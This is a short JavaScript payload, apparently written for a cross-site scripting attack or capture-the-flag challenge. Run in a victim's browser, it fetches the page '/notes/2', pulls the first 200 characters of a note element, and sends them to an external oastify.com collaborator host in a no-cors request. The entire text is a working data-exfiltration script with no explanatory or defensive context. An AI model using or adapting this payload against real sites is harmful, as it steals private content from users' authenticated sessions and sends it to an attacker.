fetch('/notes/2').then(r=>r.text()).then(d=>{
  let content = (new DOMParser()).parseFromString(d,'text/html').querySelector('div.mt-6').innerHTML.substring(0,200);
  // Use fetch with no-cors mode and limit to first 200 characters
  fetch('http://66an85cubmljzetr1e0ebgqzuq0hoec3.oastify.com/collect?data='+encodeURIComponent(content), {
    method: 'GET',
    mode: 'no-cors'  // This prevents CORS errors
  });
})
